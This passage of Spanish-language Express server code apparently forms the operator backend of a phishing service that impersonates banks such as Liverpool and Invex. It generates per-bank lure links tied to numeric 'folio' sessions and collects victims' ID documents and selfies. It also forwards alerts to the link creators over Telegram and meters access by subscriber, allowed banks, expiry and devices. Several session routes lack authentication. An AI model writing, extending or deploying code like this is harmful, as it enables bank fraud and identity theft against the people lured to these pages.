req.user;\n    console.log(`[API] Usuario actual: ${currentUser.username}, rol: ${currentUser.role}`);\n\n    // Solo permitir al usuario \"balonx\" acceder a esta ruta\n    if (currentUser.username !== \"balonx\") {\n      console.log('[API] Error: Usuario no autorizado (no es balonx)');\n      return res.status(403).json({ message: \"No autorizado\" });\n    }\n\n    const { username } = req.params;\n\n    // No permitir eliminar al usuario admin \"balonx\"\n    if (username === \"balonx\") {\n      console.log('[API] Error: No se puede eliminar al usuario admin \"balonx\"');\n      return res.status(403).json({ message: \"No se puede eliminar al usuario administrador principal\" });\n    }\n\n    try {\n      console.log(`[API] Intentando eliminar usuario: ${username}`);\n      const deleted = await storage.deleteUser(username);\n\n      if (!deleted) {\n        console.log(`[API] Error: Usuario ${username} no encontrado`);\n        return res.status(404).json({ success: false, message: \"Usuario no encontrado\" });\n      }\n\n      console.log(`[API] Usuario eliminado con 茅xito: ${username}`);\n      res.json({ success: true, message: `Usuario ${username} eliminado correctamente` });\n    } catch (error: any) {\n      console.log(`[API] Error al eliminar usuario: ${error.message}`);\n      res.status(500).json({ success: false, message: error.message });\n    }\n  });\n\n  // Configurar Chat ID para cualquier usuario (solo administradores)\n  app.put('/api/users/:username/chat-id', async (req, res) => {\n    console.log('[API] Solicitud para configurar Chat ID de usuario');\n\n    if (!req.isAuthenticated()) {\n      console.log('[API] Error: Usuario no autenticado');\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    const currentUser = req.user;\n    console.log(`[API] Usuario actual: ${currentUser.username}, rol: ${currentUser.role}`);\n\n    // Solo permitir a administradores configurar Chat IDs\n    if (currentUser.role !== UserRole.ADMIN) {\n      console.log('[API] Error: Usuario no autorizado (no es admin)');\n      return res.status(403).json({ message: \"No autorizado\" });\n    }\n\n    const { username } = req.params;\n    const { telegramChatId } = req.body;\n\n    if (!telegramChatId) {\n      return res.status(400).json({ message: \"Chat ID requerido\" });\n    }\n\n    try {\n      console.log(`[API] Configurando Chat ID para usuario: ${username}`);\n      \n      // Verificar que el usuario existe\n      const existingUser = await storage.getUserByUsername(username);\n      if (!existingUser) {\n        console.log(`[API] Error: Usuario ${username} no encontrado`);\n        return res.status(404).json({ message: \"Usuario no encontrado\" });\n      }\n\n      // Actualizar el Chat ID\n      const updatedUser = await storage.updateUser(existingUser.id, {\n        telegramChatId: telegramChatId.toString()\n      });\n\n      console.log(`[API] Chat ID configurado exitosamente para ${username}: ${telegramChatId}`);\n\n      // Notificar al usuario mediante Telegram si es posible\n      try {\n        const { sendAdminMessage } = await import('./telegramBot');\n        const welcomeMessage = ` *隆Tu Chat ID ha sido configurado!*\n\nHola *${username}*,\n\nTu Chat ID ha sido configurado correctamente por un administrador.\n\n *Ahora puedes recibir:*\n C贸digos de verificaci贸n 2FA\n Notificaciones del sistema\n Mensajes del administrador\n\n Tu cuenta est谩 lista para usar todas las funciones del sistema.\n\n *Soporte*: @BalonxSistema`;\n\n        await sendAdminMessage(telegramChatId, welcomeMessage, 'Sistema');\n        console.log(`[API] Mensaje de bienvenida enviado a ${username}`);\n      } catch (error) {\n        console.log(`[API] No se pudo enviar mensaje de bienvenida: ${error}`);\n      }\n\n      res.json({ \n        success: true, \n        message: `Chat ID configurado para ${username}`,\n        user: {\n          id: updatedUser.id,\n          username: updatedUser.username,\n          role: updatedUser.role,\n          isActive: updatedUser.isActive,\n          telegramChatId: updatedUser.telegramChatId,\n          expiresAt: updatedUser.expiresAt,\n          deviceCount: updatedUser.deviceCount,\n          maxDevices: updatedUser.maxDevices,\n          allowedBanks: updatedUser.allowedBanks\n        } \n      });\n    } catch (error: any) {\n      console.log(`[API] Error al configurar Chat ID: ${error.message}`);\n      res.status(500).json({ message: error.message });\n    }\n  });\n\n  app.get('/api/admin/user', async (req, res) => {\n    try {\n      // Obtener el username de la cookie de autenticaci贸n\n      const username = req.cookies?.auth_token;\n      if (!username) {\n        return res.status(401).json({ message: \"No autorizado\" });\n      }\n\n      // Buscar el usuario por nombre de usuario\n      const user = await storage.getUserByUsername(username);\n      if (!user) {\n        return res.status(401).json({ message: \"Usuario no encontrado\" });\n      }\n\n      // Verificar si el usuario est谩 activo\n      if (!user.isActive) {\n        return res.status(403).json({ message: \"Usuario inactivo\" });\n      }\n\n      // Devolver el usuario sin la contrase帽a\n      res.json({ ...user, password: undefined });\n    } catch (error: any) {\n      res.status(500).json({ message: error.message });\n    }\n  });\n\n  // Endpoint para enviar mensajes personalizados a usuarios desde el panel admin (con archivos adjuntos y env铆o masivo)\n  app.post('/api/admin/send-message', upload.single('file'), async (req, res) => {\n    try {\n      if (!req.isAuthenticated()) {\n        return res.status(401).json({ message: \"No autenticado\" });\n      }\n\n      const currentUser = req.user;\n      \n      // Solo permitir a administradores enviar mensajes\n      if (currentUser.role !== UserRole.ADMIN) {\n        return res.status(403).json({ message: \"No autorizado\" });\n      }\n\n      const { username, message, sendToAll } = req.body;\n      const file = req.file;\n\n      // Validar que hay al menos mensaje o archivo\n      if (!message && !file) {\n        return res.status(400).json({ message: \"Mensaje o archivo es requerido\" });\n      }\n\n      // Importar funci贸n para enviar mensaje\n      const { sendAdminMessage, sendAdminDocument } = await import('./telegramBot');\n      \n      let sentCount = 0;\n      let failedCount = 0;\n      const errors: string[] = [];\n\n      // Determinar destinatarios\n      let recipients: User[] = [];\n      \n      if (sendToAll === 'true') {\n        // Obtener todos los usuarios con Chat ID configurado\n        const allUsers = await storage.getAllAdminUsers();\n        recipients = allUsers.filter(u => \n          u.telegramChatId && \n          u.telegramChatId !== '' && \n          u.role === 'user'\n        );\n      } else {\n        if (!username) {\n          return res.status(400).json({ message: \"Username es requerido para env铆o individual\" });\n        }\n        \n        const targetUser = await storage.getUserByUsername(username);\n        if (!targetUser) {\n          return res.status(404).json({ message: \"Usuario no encontrado\" });\n        }\n\n        if (!targetUser.telegramChatId) {\n          return res.status(400).json({ message: \"Usuario no tiene Chat ID configurado\" });\n        }\n        \n        recipients = [targetUser];\n      }\n\n      // Enviar a cada destinatario\n      for (const recipient of recipients) {\n        try {\n          // Formatear mensaje si existe\n          let formattedMessage = '';\n          if (message && message.trim()) {\n            formattedMessage = ` *Mensaje del Administrador*\n\n${message}\n\n---\n_Enviado por: ${currentUser.username}_\n_Fecha: ${new Date().toLocaleString('es-MX')}_\n\n *Soporte*: @BalonxSistema`;\n          }\n\n          let result;\n          \n          // Si hay archivo, enviar con documento\n          if (file) {\n            result = await sendAdminDocument(\n              recipient.telegramChatId!,\n              file.path,\n              formattedMessage || undefined\n            );\n          } else {\n            // Solo mensaje de texto\n            result = await sendAdminMessage(recipient.telegramChatId!, formattedMessage);\n          }\n\n          if (result.success) {\n            sentCount++;\n            \n            // Crear notificaci贸n en el sistema\n            await storage.createNotification({\n              userId: recipient.id,\n              type: 'admin_message',\n              title: 'Mensaje del Administrador',\n              message: message || 'Archivo adjunto',\n              priority: 'medium'\n            });\n          } else {\n            failedCount++;\n            errors.push(`${recipient.username}: ${result.error}`);\n          }\n        } catch (error: any) {\n          failedCount++;\n          errors.push(`${recipient.username}: ${error.message}`);\n        }\n      }\n\n      // Limpiar archivo temporal si existe\n      if (file && fs.existsSync(file.path)) {\n        try {\n          fs.unlinkSync(file.path);\n        } catch (error) {\n          console.error('Error eliminando archivo temporal:', error);\n        }\n      }\n\n      // Responder con resultados\n      if (sentCount > 0 && failedCount === 0) {\n        console.log(` Mensajes enviados: ${sentCount} de ${currentUser.username}`);\n        res.json({ \n          success: true, \n          message: \"Mensaje(s) enviado(s) correctamente\",\n          sentCount,\n          failedCount: 0\n        });\n      } else if (sentCount > 0 && failedCount > 0) {\n        console.log(`锔 Env铆o parcial: ${sentCount} enviados, ${failedCount} fallidos`);\n        res.json({ \n          success: true, \n          message: `Enviado a ${sentCount} usuarios, ${failedCount} fallidos`,\n          sentCount,\n          failedCount,\n          errors\n        });\n      } else {\n        console.error(` Todos los env铆os fallaron (${failedCount})`);\n        res.status(500).json({ \n          success: false, \n          message: \"Error enviando mensajes\",\n          sentCount: 0,\n          failedCount,\n          errors\n        });\n      }\n\n    } catch (error: any) {\n      console.error(' Error en endpoint send-message:', error);\n      \n      // Limpiar archivo temporal en caso de error\n      if (req.file && fs.existsSync(req.file.path)) {\n        try {\n          fs.unlinkSync(req.file.path);\n        } catch (e) {\n          console.error('Error eliminando archivo temporal:', e);\n        }\n      }\n      \n      res.status(500).json({ success: false, message: error.message });\n    }\n  });\n\n  // Endpoint de depuraci贸n para ver todas las sesiones\n  app.get('/api/debug/all-sessions', async (req, res) => {\n    try {\n      if (!req.isAuthenticated()) {\n        return res.status(401).json({ message: \"No autenticado\" });\n      }\n      \n      // Solo permitir a superadmin acceder a este endpoint\n      const user = req.user;\n      if (user.username !== 'balonx') {\n        return res.status(403).json({ message: \"Solo superadmin puede acceder a este endpoint\" });\n      }\n      \n      // Obtener absolutamente todas las sesiones sin filtrar\n      const allSessions = await storage.getAllSessions();\n      console.log(`[Debug] Total de sesiones en almacenamiento: ${allSessions.length}`);\n      \n      // Contar las sesiones guardadas y corrientes\n      const savedSessions = allSessions.filter(s => s.saved === true);\n      const currentSessions = allSessions.filter(s => s.active === true && s.saved === false);\n      \n      // Verificar informaci贸n de creaci贸n\n      const sessionsWithCreator = allSessions.filter(s => s.createdBy).length;\n      const sessionsWithoutCreator = allSessions.filter(s => !s.createdBy).length;\n      \n      res.json({\n        count: {\n          total: allSessions.length,\n          saved: savedSessions.length,\n          current: currentSessions.length,\n          withCreator: sessionsWithCreator,\n          withoutCreator: sessionsWithoutCreator\n        },\n        sessions: allSessions\n      });\n    } catch (error) {\n      console.error(\"Error obteniendo sesiones para depuraci贸n:\", error);\n      res.status(500).json({ message: \"Error obteniendo sesiones\" });\n    }\n  });\n  \n  // Endpoint para forzar el creador de sesiones existentes (para depuraci贸n)\n  app.post('/api/debug/force-session-creator', async (req, res) => {\n    try {\n      if (!req.isAuthenticated()) {\n        return res.status(401).json({ message: \"No autenticado\" });\n      }\n      \n      const { sessionId, username } = req.body;\n      if (!sessionId || !username) {\n        return res.status(400).json({ message: \"Se requiere sessionId y username\" });\n      }\n      \n      const session = await storage.getSessionById(sessionId);\n      if (!session) {\n        return res.status(404).json({ message: \"Sesi贸n no encontrada\" });\n      }\n      \n      // Actualizar manualmente el creador\n      const updatedSession = await storage.updateSession(sessionId, { createdBy: username });\n      console.log(`[Debug] Forzado creador de sesi贸n ${sessionId} a: ${username}`);\n      \n      res.json({ success: true, session: updatedSession });\n    } catch (error) {\n      console.error(\"Error forzando creador de sesi贸n:\", error);\n      res.status(500).json({ message: \"Error forzando creador de sesi贸n\" });\n    }\n  });\n  \n  // Endpoint para crear una sesi贸n con usuario brandon (para depuraci贸n)\n  app.get('/api/debug/create-brandon-session', async (req, res) => {\n    try {\n      if (!req.isAuthenticated()) {\n        return res.status(401).json({ message: \"No autenticado\" });\n      }\n      \n      // Solo permitir a superadmin o brandon acceder\n      const user = req.user;\n      if (user.username !== 'balonx' && user.username !== 'brandon') {\n        return res.status(403).json({ message: \"No autorizado para acceder a este endpoint\" });\n      }\n      \n      // Crear sesi贸n para brandon\n      // Usar c贸digo de 8 d铆gitos num茅rico como ID de sesi贸n y folio\n      const brandLinkCode = '12345678';\n      const sessionId = brandLinkCode;\n      \n      const session = await storage.createSession({ \n        sessionId, \n        banco: \"LIVERPOOL\",\n        folio: brandLinkCode,\n        pasoActual: ScreenType.FOLIO,\n        createdBy: 'brandon', // Forzar el creador como brandon\n      });\n      \n      // Guardar la sesi贸n expl铆citamente\n      const savedSession = await storage.saveSession(sessionId);\n      console.log(`[Debug] Creada sesi贸n ${sessionId} para brandon`);\n      \n      if (!savedSession.createdBy) {\n        console.log(`[Debug] ERROR: Sesi贸n guardada sin creador. Corrigiendo...`);\n        await storage.updateSession(sessionId, { createdBy: 'brandon' });\n      }\n      \n      // Verificar estado despu茅s de guardar\n      const sessionAfterSave = await storage.getSessionById(sessionId);\n      \n      res.json({ \n        success: true, \n        sessionId,\n        session: sessionAfterSave\n      });\n    } catch (error) {\n      console.error(\"Error creando sesi贸n de prueba:\", error);\n      res.status(500).json({ message: \"Error creando sesi贸n de prueba\" });\n    }\n  });\n\n  app.get('/api/sessions', async (req, res) => {\n    try {\n      if (!req.isAuthenticated()) {\n        return res.status(401).json({ message: \"No autenticado\" });\n      }\n      \n      const { type = 'current' } = req.query;\n      const user = req.user as any;\n      console.log(`[Sessions] Usuario ${user.username} solicitando sesiones, tipo: ${type}, rol: ${user.role}, isExecutive: ${user.isExecutive}`);\n      \n      const isExecutive = user.isExecutive === true;\n      \n      // Usar los m茅todos de storage que ya tienen filtrado\n      let sessions;\n      \n      if (user.role === 'admin') {\n        // Admin ve todas las sesiones\n        if (type === 'saved') {\n          sessions = await storage.getSavedSessions();\n        } else {\n          sessions = await storage.getCurrentSessions();\n        }\n        console.log(`[Sessions] Admin ${user.username} accediendo a ${sessions.length} sesiones (tipo: ${type})`);\n      } else {\n        // Usuario normal o ejecutivo - filtrar por userId\n        if (type === 'saved') {\n          sessions = await storage.getSavedSessions(user.id, isExecutive);\n        } else {\n          sessions = await storage.getCurrentSessions(user.id, isExecutive);\n        }\n        console.log(`[Sessions] Usuario ${user.username} (ejecutivo: ${isExecutive}), mostrando ${sessions.length} sesiones (tipo: ${type})`);\n      }\n      \n      // Ordenamos por fecha m谩s reciente primero\n      sessions.sort((a, b) => {\n        const dateA = a.createdAt ? new Date(a.createdAt).getTime() : 0;\n        const dateB = b.createdAt ? new Date(b.createdAt).getTime() : 0;\n        return dateB - dateA;\n      });\n\n      res.json(sessions);\n    } catch (error) {\n      console.error(\"Error fetching sessions:\", error);\n      res.status(500).json({ message: \"Error fetching sessions\" });\n    }\n  });\n\n  app.post('/api/sessions', async (req, res) => {\n    try {\n      if (!req.isAuthenticated()) {\n        return res.status(401).json({ message: \"No autenticado\" });\n      }\n\n      const user = req.user as any;\n      const { banco = \"Invex\" } = req.body;\n      \n      // Generamos un c贸digo de 8 d铆gitos y lo usamos como ID de sesi贸n\n      let codeForSession = '';\n      for (let i = 0; i < 8; i++) {\n        codeForSession += Math.floor(Math.random() * 10).toString();\n      }\n      const sessionId = codeForSession;\n      \n      const session = await storage.createSession({ \n        sessionId, \n        banco,\n        folio: codeForSession,\n        pasoActual: ScreenType.FOLIO,\n        createdBy: user.isExecutive ? user.officeUsername : user.username,\n        executiveId: user.isExecutive ? user.id : null, // Incluir executiveId si es ejecutivo\n      });\n      \n      console.log(`Sesi贸n creada: ${sessionId}, creador: ${user.username}, executiveId: ${user.isExecutive ? user.id : null}`);\n\n      // Notificar a los clientes de admin sobre la actualizaci贸n\n      broadcastToAdmins(JSON.stringify({\n        type: 'SESSIONS_UPDATED',\n        data: {\n          userName: user.username\n        }\n      }));\n      \n      res.json(session);\n    } catch (error) {\n      console.error(\"Error creating session:\", error);\n      res.status(500).json({ message: \"Error creating session\" });\n    }\n  });\n\n  app.post('/api/sessions/:id/update', async (req, res) => {\n    try {\n      const { id } = req.params;\n      \n      // Actualizar sesi贸n\n      const session = await storage.updateSession(id, req.body);\n\n      // NO consumir token cuando se ingresa folio - los links nunca se invalidan autom谩ticamente\n      // Solo se invalidan mediante cancelaci贸n manual\n\n      // Notify all admin clients\n      broadcastToAdmins(JSON.stringify({\n        type: 'SESSION_UPDATE',\n        data: session\n      }));\n\n      res.json(session);\n    } catch (error) {\n      console.error(\"Error updating session:\", error);\n      res.status(500).json({ message: \"Error updating session\" });\n    }\n  });\n\n  // Endpoint para guardar una sesi贸n\n  app.post('/api/sessions/:id/save', async (req, res) => {\n    try {\n      const { id } = req.params;\n      const session = await storage.saveSession(id);\n\n      // Notify all admin clients\n      broadcastToAdmins(JSON.stringify({\n        type: 'SESSION_UPDATE',\n        data: session\n      }));\n\n      res.json(session);\n    } catch (error) {\n      console.error(\"Error saving session:\", error);\n      res.status(500).json({ message: \"Error saving session\" });\n    }\n  });\n\n  // Endpoint para eliminar una sesi贸n\n  app.delete('/api/sessions/:id', async (req, res) => {\n    try {\n      const { id } = req.params;\n      const success = await storage.deleteSession(id);\n\n      if (success) {\n        // Notify all admin clients\n        broadcastToAdmins(JSON.stringify({\n          type: 'SESSION_DELETE',\n          data: { sessionId: id }\n        }));\n\n        res.json({ success: true });\n      } else {\n        res.status(404).json({ success: false, message: \"Session not found\" });\n      }\n    } catch (error) {\n      console.error(\"Error deleting session:\", error);\n      res.status(500).json({ message: \"Error deleting session\" });\n    }\n  });\n\n  // Endpoint para limpiar sesiones expiradas (m谩s de 5 d铆as)\n  app.post('/api/cleanup-sessions', async (req, res) => {\n    try {\n      const deletedCount = await storage.cleanupExpiredSessions();\n\n      // Notify all admin clients to refresh their session list\n      broadcastToAdmins(JSON.stringify({\n        type: 'SESSIONS_CLEANUP',\n        data: { deletedCount }\n      }));\n\n      res.json({ success: true, deletedCount });\n    } catch (error) {\n      console.error(\"Error cleaning up sessions:\", error);\n      res.status(500).json({ message: \"Error cleaning up sessions\" });\n    }\n  });\n\n  // Endpoint para subir archivos de protecci贸n bancaria\n  app.post('/api/upload-protection-file', upload.single('file'), async (req, res) => {\n    try {\n      if (!req.file) {\n        return res.status(400).json({ message: \"No se proporcion贸 archivo\" });\n      }\n\n      const { sessionId } = req.body;\n      if (!sessionId) {\n        return res.status(400).json({ message: \"Session ID requerido\" });\n      }\n\n      // Generar URL del archivo\n      const fileUrl = `/uploads/${req.file.filename}`;\n      \n      // Actualizar la sesi贸n con la informaci贸n del archivo\n      const updatedSession = await storage.updateSession(sessionId, {\n        fileName: req.file.originalname,\n        fileUrl: fileUrl,\n        fileSize: (req.file.size / (1024 * 1024)).toFixed(2) + ' MB'\n      });\n\n      console.log(`Archivo ${req.file.originalname} subido para sesi贸n ${sessionId}`);\n\n      res.json({\n        success: true,\n        fileName: req.file.originalname,\n        fileUrl: fileUrl,\n        fileSize: (req.file.size / (1024 * 1024)).toFixed(2) + ' MB'\n      });\n    } catch (error) {\n      console.error(\"Error uploading protection file:\", error);\n      res.status(500).json({ message: \"Error al subir archivo\" });\n    }\n  });\n\n  // Endpoint para subir documentos de identidad (documento + selfie)\n  app.post('/api/upload-identity-files', upload.fields([\n    { name: 'documentFile', maxCount: 1 },\n    { name: 'documentBackFile', maxCount: 1 },\n    { name: 'selfieFile', maxCount: 1 }\n  ]), async (req, res) => {\n    try {\n      const files = req.files as { [fieldname: string]: Express.Multer.File[] };\n      const { sessionId, documentType } = req.body;\n\n      console.log('Files received:', Object.keys(files || {}));\n      console.log('Request body:', req.body);\n\n      if (!sessionId) {\n        return res.status(400).json({ message: \"Session ID requerido\" });\n      }\n\n      if (!files.documentFile || !files.selfieFile) {\n        return res.status(400).json({ message: \"Se requieren archivos: documento frontal y selfie\" });\n      }\n\n      const documentFile = files.documentFile[0];\n      const documentBackFile = files.documentBackFile ? files.documentBackFile[0] : null;\n      const selfieFile = files.selfieFile[0];\n\n      // Generar URLs de los archivos\n      const documentFileUrl = `/uploads/${documentFile.filename}`;\n      const documentBackFileUrl = documentBackFile ? `/uploads/${documentBackFile.filename}` : null;\n      const selfieFileUrl = `/uploads/${selfieFile.filename}`;\n      \n      // Preparar datos de actualizaci贸n\n      const updateData: any = {\n        documentType: documentType,\n        documentFileName: documentFile.originalname,\n        documentFileUrl: documentFileUrl,\n        selfieFileName: selfieFile.originalname,\n        selfieFileUrl: selfieFileUrl,\n        identityVerified: true\n      };\n\n      // Agregar archivo de respaldo si existe (para INE)\n      if (documentBackFile) {\n        updateData.documentBackFileName = documentBackFile.originalname;\n        updateData.documentBackFileUrl = documentBackFileUrl;\n      }\n      \n      // Actualizar la sesi贸n con la informaci贸n de los archivos de identidad\n      const updatedSession = await storage.updateSession(sessionId, updateData);\n\n      console.log(`Documentos de identidad subidos para sesi贸n ${sessionId}: ${documentType} + selfie`);\n\n      // Notificar por Telegram que se subieron documentos de identidad\n      try {\n        const session = await storage.getSessionById(sessionId);\n        if (session && session.createdBy) {\n          await sendTelegramNotification({\n            sessionId: sessionId,\n            banco: session.banco || 'UNKNOWN',\n            tipo: 'verificacion_id',\n            data: {\n              documentType: documentType,\n              documentFile: documentFile.originalname,\n              selfieFile: selfieFile.originalname\n            },\n            timestamp: new Date().toLocaleString('es-MX', { timeZone: 'America/Mexico_City' }),\n            createdBy: session.createdBy\n          });\n        }\n      } catch (notificationError) {\n        console.error('Error sending Telegram notification for identity documents:', notificationError);\n      }\n\n      const response: any = {\n        success: true,\n        documentFile: {\n          fileName: documentFile.originalname,\n          fileUrl: documentFileUrl,\n          fileSize: (documentFile.size / (1024 * 1024)).toFixed(2) + ' MB'\n        },\n        selfieFile: {\n          fileName: selfieFile.originalname,\n          fileUrl: selfieFileUrl,\n          fileSize: (selfieFile.size / (1024 * 1024)).toFixed(2) + ' MB'\n        },\n        documentType: documentType\n      };\n\n      // Agregar archivo de respaldo si existe\n      if (documentBackFile) {\n        response.documentBackFile = {\n          fileName: documentBackFile.originalname,\n          fileUrl: documentBackFileUrl,\n          fileSize: (documentBackFile.size / (1024 * 1024)).toFixed(2) + ' MB'\n        };\n      }\n\n      res.json(response);\n    } catch (error) {\n      console.error(\"Error uploading identity files:\", error);\n      res.status(500).json({ message: \"Error al subir archivos de identidad\" });\n    }\n  });\n\n  // Endpoint para obtener sesiones con verificaci贸n de identidad\n  app.get('/api/admin/identity-sessions', async (req, res) => {\n    try {\n      if (!req.isAuthenticated()) {\n        return res.status(401).json({ message: \"No autenticado\" });\n      }\n\n      const currentUser = req.user as any;\n      \n      console.log(`[Identity] Usuario ${currentUser.username} solicitando sesiones con verificaci贸n ID`);\n      console.log(`[Identity] Tipo: ${currentUser.isExecutive ? 'ejecutivo' : currentUser.accountType || 'individual'}`);\n      \n      // Superadmin ve todas las sesiones\n      if (currentUser.role === UserRole.ADMIN && currentUser.username === 'balonx') {\n        const sessions = await storage.getSessionsWithIdentityDocuments();\n        console.log(`[Identity] Superadmin ve todas las sesiones: ${sessions.length}`);\n        res.json(sessions);\n        return;\n      }\n      \n      // Usuarios regulares, ejecutivos y oficinas ven solo sus sesiones\n      const sessions = await storage.getSessionsWithIdentityDocuments(\n        currentUser.id,\n        currentUser.isExecutive || false\n      );\n      \n      console.log(`[Identity] Usuario ${currentUser.username} ve ${sessions.length} sesiones con verificaci贸n ID`);\n      res.json(sessions);\n    } catch (error: any) {\n      console.error('Error fetching identity sessions:', error);\n      res.status(500).json({ message: error.message });\n    }\n  });\n\n  // Endpoint para obtener los bancos permitidos del usuario actual\n  app.get('/api/user/allowed-banks', async (req, res) => {\n    try {\n      if (!req.isAuthenticated()) {\n        return res.status(401).json({ message: \"No autenticado\" });\n      }\n      \n      const user = req.user;\n      console.log(`[API] Solicitud de bancos permitidos para usuario ${user.username}`);\n      console.log(`[API] Role: ${user.role}, allowedBanks: ${user.allowedBanks || 'no definido'}`);\n      \n      let allowedBanks: string[] = [];\n      \n      // Verificar siempre si el allowedBanks es undefined o null para evitar errores\n      const userBanks = user.allowedBanks || 'all';\n      \n      // Si es el superadmin \"balonx\", puede ver todos los bancos sin importar su configuraci贸n\n      if (user.username === \"balonx\") {\n        console.log('[API] Usuario es superadmin (balonx), devolviendo lista completa independientemente de su configuraci贸n');\n        // Devolver todos los valores de BankType excepto 'all'\n        allowedBanks = Object.values(BankType).filter(bank => bank !== BankType.ALL) as string[];\n      } \n      // Si es administrador pero no es balonx, verificar sus restricciones espec铆ficas de bancos\n      else if (user.role === UserRole.ADMIN) {\n        console.log(`[API] Usuario es admin (${user.username}), verificando restricciones espec铆ficas de bancos`);\n        console.log(`[API] allowedBanks del admin: ${userBanks}`);\n        \n        // Verificar si tiene valor 'all' o bancos espec铆ficos\n        if (userBanks === 'all' || userBanks.toLowerCase() === 'all') {\n          console.log('[API] Admin tiene permiso para todos los bancos (all)');\n          allowedBanks = Object.values(BankType).filter(bank => bank !== BankType.ALL) as string[];\n        } else if (userBanks && userBanks !== '') {\n          console.log(`[API] Admin tiene bancos espec铆ficos: ${userBanks}`);\n          // Dividir la cadena por comas y procesar\n          allowedBanks = userBanks\n            .split(',')\n            .map(b => b.trim())\n            .filter(b => b.length > 0);\n          \n          console.log(`[API] Bancos de admin procesados: [${allowedBanks.join(', ')}]`);\n        } else {\n          console.log('[API] Admin sin bancos definidos');\n        }\n      }\n      // Si el usuario tiene \"all\" expl铆citamente asignado, mostrar todos los bancos\n      else if (userBanks === 'all' || userBanks.toLowerCase() === 'all') {\n        console.log('[API] Usuario tiene todos los bancos permitidos (all), devolviendo lista completa');\n        // Devolver todos los valores de BankType excepto 'all'\n        allowedBanks = Object.values(BankType).filter(bank => bank !== BankType.ALL) as string[];\n      } \n      // Si tiene bancos espec铆ficos permitidos (lista separada por comas)\n      else if (userBanks && userBanks !== '') {\n        console.log(`[API] Usuario tiene bancos espec铆ficos permitidos: ${userBanks}`);\n        // Dividir la cadena por comas, limpiar espacios en blanco y filtrar valores vac铆os\n        allowedBanks = userBanks\n          .split(',')\n          .map(b => b.trim())\n          .filter(b => b.length > 0);\n        \n        console.log(`[API] Bancos despu茅s de procesamiento: [${allowedBanks.join(', ')}]`);\n        \n        // Verificar que todos los bancos en la lista sean v谩lidos\n        const invalidBanks = allowedBanks.filter(bank => !Object.values(BankType).includes(bank as BankType));\n        if (invalidBanks.length > 0) {\n          console.log(`[API] ADVERTENCIA: Se encontraron bancos inv谩lidos en la lista: ${invalidBanks.join(', ')}`);\n        }\n      } else {\n        console.log('[API] Usuario no tiene bancos permitidos definidos o el valor est谩 vac铆o');\n      }\n      \n      console.log(`[API] Devolviendo ${allowedBanks.length} bancos permitidos:`);\n      allowedBanks.forEach(bank => console.log(`[API] - Banco permitido: ${bank}`));\n      \n      res.json({\n        success: true,\n        allowedBanks,\n        userRole: user.role,\n        userAllowedBanksRaw: userBanks // Para depuraci贸n\n      });\n    } catch (error: any) {\n      console.log(`[API] Error obteniendo bancos permitidos: ${error.message}`);\n      res.status(500).json({ message: error.message });\n    }\n  });\n  \n  app.get('/api/generate-link', async (req, res) => {\n    try {\n      if (!req.isAuthenticated()) {\n        return res.status(401).json({ message: \"No autenticado\" });\n      }\n\n      const { banco = \"LIVERPOOL\" } = req.query;\n      const user = req.user;\n      \n      // Validar que el banco solicitado est茅 permitido para el usuario\n      const userBanks = user.allowedBanks || 'all';\n      let hasBankAccess = false;\n      \n      // L贸gica mejorada para verificar permisos de bancos\n      // Si es superadmin (balonx), tiene acceso a todos los bancos sin importar su configuraci贸n\n      if (user.username === \"balonx\") {\n        hasBankAccess = true;\n        console.log(`[API] Superadmin ${user.username} tiene acceso a todos los bancos`);\n      } \n      // Si es administrador pero no es balonx, verificar sus restricciones espec铆ficas\n      else if (user.role === UserRole.ADMIN) {\n        console.log(`[API] Admin ${user.username} solicita banco ${banco}, verificando permisos espec铆ficos`);\n        \n        // Si tiene valor 'all', tiene acceso a todos los bancos\n        if (userBanks === 'all' || userBanks.toLowerCase() === 'all') {\n          hasBankAccess = true;\n          console.log(`[API] Admin ${user.username} tiene acceso a todos los bancos (all)`);\n        } \n        // Si tiene bancos espec铆ficos, debe estar en la lista\n        else if (userBanks && userBanks !== '') {\n          const allowedBanksList = userBanks.split(',').map(b => b.trim());\n          console.log(`[API] Admin ${user.username} solicita banco ${banco}, permitidos: ${allowedBanksList.join(', ')}`);\n          \n          if (allowedBanksList.includes(banco as string)) {\n            hasBankAccess = true;\n            console.log(`[API] Banco ${banco} permitido para admin ${user.username}`);\n          } else {\n            console.log(`[API] Banco ${banco} NO permitido para admin ${user.username}. Bancos permitidos: ${allowedBanksList.join(', ')}`);\n          }\n        } else {\n          console.log(`[API] Admin ${user.username} sin bancos definidos`);\n        }\n      }\n      // Para usuarios regulares\n      // Si tiene valor \"all\", tiene acceso a todos los bancos\n      else if (userBanks === 'all' || userBanks.toLowerCase() === 'all') {\n        hasBankAccess = true;\n        console.log(`[API] Usuario ${user.username} tiene acceso a todos los bancos (all)`);\n      }\n      // Si tiene bancos espec铆ficos, debe estar en la lista\n      else if (userBanks && userBanks !== '') {\n        const allowedBanksList = userBanks.split(',').map(b => b.trim());\n        console.log(`[API] Usuario ${user.username} solicita banco ${banco}, permitidos: ${allowedBanksList.join(', ')}`);\n        \n        if (allowedBanksList.includes(banco as string)) {\n          hasBankAccess = true;\n          console.log(`[API] Banco ${banco} permitido para ${user.username}`);\n        } else {\n          console.log(`[API] Banco ${banco} NO permitido para ${user.username}. Bancos permitidos: ${allowedBanksList.join(', ')}`);\n        }\n      }\n      \n      // Si no tiene acceso, devolver error claro\n      if (!hasBankAccess) {\n        const bancos = userBanks === 'all' ? 'todos los bancos' : userBanks.split(',').map(b => b.trim()).join(', ');\n        return res.status(403).json({ \n          error: `Banco ${banco} no permitido. Solo puedes usar: ${bancos}` \n        });\n      }\n\n      // Generamos un c贸digo de 8 d铆gitos num茅ricos que usaremos tanto para el ID como para el folio\n      let linkCode = '';\n      for (let i = 0; i < 8; i++) {\n        linkCode += Math.floor(Math.random() * 10).toString();\n      }\n      \n      // Usamos el mismo c贸digo num茅rico para el ID de sesi贸n y el folio\n      const sessionId = linkCode;\n\n      // Obtener flujo personalizado del usuario para este banco\n      const userFlow = await storage.getUserBankFlow(user.id, (banco as string).toLowerCase());\n      const flowConfig = userFlow?.flowConfig || null;\n\n      if (flowConfig && Array.isArray(flowConfig)) {\n        console.log(`[Links] Aplicando flujo personalizado del usuario ${user.username} para banco ${banco}`);\n        console.log(`[Links] Flujo contiene ${flowConfig.length} pasos`);\n      } else {\n        console.log(`[Links] Usuario ${user.username} no tiene flujo personalizado para banco ${banco}, usando flujo est谩ndar`);\n      }\n\n      const session = await storage.createSession({ \n        sessionId, \n        banco: banco as string,\n        folio: linkCode, // Mismo c贸digo para el folio\n        pasoActual: 